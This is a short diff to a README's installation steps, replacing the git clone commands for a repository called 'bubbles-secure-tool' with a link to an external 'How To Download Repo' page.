@@ -19,11 +19,8 @@
 
 ## Installation
 
-1. Clone this repository:
-```
-git clone https://github.com/kernferm/bubbles-secure-tool.git
-cd bubbles-secure-tool
-```
+1. How To Download Repo 
+[How-To-Download-Repo](https://www.gitprojects.fnbubbles420.org/how-to-download-repos)
 
 2. Install the dependencies:
 
